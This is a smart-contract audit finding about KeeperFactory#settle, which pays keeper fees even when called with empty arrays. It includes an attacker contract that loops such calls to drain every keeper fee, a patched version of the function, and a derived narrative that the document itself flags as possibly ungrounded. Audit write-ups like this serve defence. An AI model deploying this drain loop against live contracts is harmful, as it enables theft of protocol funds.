---
id: 20388
severity: "High"
---

# Attacker can call KeeperFactory#settle with empty

## Description

```solidity
Anyone can call KeeperFactory#request, inputting empty arrays as parameters, and
the call will succeed, and the caller receives a fee.
Attacker can perform this attack many times within a loop to steal ALL keeper fees
from protocol.
Expected Workflow:
• User calls Market#update to open a new position
• Market calls Oracle#request to request a new oracleVersion
– The User's account gets added to a callback array of the market
• Once new oracleVersion gets committed, keepers can call
KeeperFactory#settle, which will call Market#update on accounts in the
Market's callback array, and pay the keeper(i.e. caller) a fee.
– KeeperFactory#settle call will fail if there is no account to settle(i.e. if
callback array is empty)
– After settleing an account, it gets removed from the callback array
The issue:
Here is KeeperFactory#settle function:
function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory
versions, uint256[] memory maxCounts)
external
keep(settleKeepConfig(), msg.data, 0, "")
{
    if (
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions,
        maxCounts)).length != msg.data.length
    )
        revert KeeperFactoryInvalidSettleError();
    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i],
        maxCounts[i]);
}
```
As we can see, function does not check if the length of the array is 0, so if user
inputs empty array, the for loop will not be entered, but the keeper still receives a
fee via the keep modifier.
Attacker can have a contract perform the attack multiple times in a loop to drain all
fees:
```solidity
interface IKeeperFactory{
    function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[]
    memory versions,uint256[] memory maxCounts
    ) external;
}
interface IMarket{
    function update()external;
}
contract AttackContract{
    address public attacker;
    address public keeperFactory;
    IERC20 public keeperToken;
    constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){
        attacker=msg.sender;
        keeperFactory=perennialDeployedKeeperFactory;
        keeperToken=_keeperToken;
    }
    function attack()external{
        require(msg.sender==attacker,"not allowed");
        bool canSteal=true;
        // empty arrays as parameters
        bytes32[] memory ids=[];
        IMarket[] memory markets=[];
        uint256[] memory versions=[];
        uint256[] memory maxCounts=[];
        // perform attack in a loop till all funds are drained or call reverts
        while(canSteal){
            try
            IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){
            //
            }catch{
                canSteal=false;
            }
        }
        keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this)));
    }
}
```
All keeper fees can be stolen from protocol, and there will be no way to incentivize
Keepers to commitRequested oracle version, and other keeper tasks

## Proof of Concept

no poc

## Recommendation

```solidity
Within KeeperFactory#settle function, revert if ids.length==0:
function settle(
    bytes32[] memory ids,
    IMarket[] memory markets,
    uint256[] memory versions,
    uint256[] memory maxCounts
)external keep(settleKeepConfig(), msg.data, 0, "") {
    if (
        ids.length==0 ||
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions,
        maxCounts)).length != msg.data.length
    ) revert KeeperFactoryInvalidSettleError();
    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i],
        maxCounts[i]);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the KeeperFactory contract’s settle function, which is intended to iterate over a list of oracle identifiers, markets, versions and maximum counts, call the corresponding oracle’s settle method for each entry, and reward the caller (the keeper) for performing the work. The function validates that the four input arrays have matching lengths and that the calldata size matches the encoded call, but it does not verify that the arrays contain at least one element. Because the keep modifier that wraps the function awards a fee unconditionally, a caller can supply empty arrays, causing the for‑loop to be skipped while the fee is still transferred. An attacker can therefore invoke settle repeatedly with empty parameters, each call draining a portion of the keeper fee pool without performing any settlement. Over time, by looping until the fee balance is exhausted, the attacker can steal all keeper fees that were meant to incentivize honest keepers. This flaw occurs whenever the settle function is publicly callable and the protocol relies on the fee payment as a reward for genuine work. The affected parties include the protocol’s economic model (keeper incentives), users who expect oracle updates to be processed, and any token holders whose keeper token balance is reduced by the illicit fee extraction. The issue was discovered during a manual audit that examined input validation and noticed the missing zero‑length check. It is subtle because the function appears to perform useful work and the fee payment is tied to a modifier, so the absence of work is not immediately obvious from the external interface. The bug belongs to the class of unchecked input leading to unintended reward extraction, similar to “empty‑array fee drain” or “unchecked loop guard” vulnerabilities. From a user’s perspective the protocol may stop updating positions, keepers receive fees without any settlement activity, and the keeper token balance may mysteriously shrink to zero, violating the expectation that fees are paid only for actual work. The proper remediation is to add an explicit check that the length of the ids (or any of the input arrays) is greater than zero and revert with an appropriate error if it is not, thereby ensuring that fees are only granted when at least one settlement is performed.
